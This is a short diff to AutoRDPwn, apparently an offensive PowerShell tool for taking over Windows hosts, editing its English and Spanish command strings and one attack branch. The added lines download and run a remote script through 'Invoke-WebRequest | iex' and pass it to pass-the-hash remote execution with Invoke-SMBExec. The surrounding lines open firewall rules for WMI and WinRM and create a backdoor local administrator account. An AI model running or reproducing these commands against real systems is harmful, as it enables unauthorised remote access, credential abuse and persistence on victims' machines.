@@ -116,6 +116,7 @@ if($Language -in 'English') {
   $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
   $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
   $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
+  $Pwn6b = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
   $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
   $Pwn8  = "RDP session agent" }
 
@@ -174,6 +175,7 @@ if($Language -in 'Spanish') {
   $Pwn4  = "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
   $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
   $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
+  $Pwn6b = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
   $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
   $Pwn8  = "Agente de sesión de RDP" }
 
@@ -226,7 +228,7 @@ if($Language -in 'Spanish') {
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5"
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6"
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn7"
-        $user = 'AutoRDPwn' ; Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6" }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6b" }
 
 	'3' {
         Write-Host
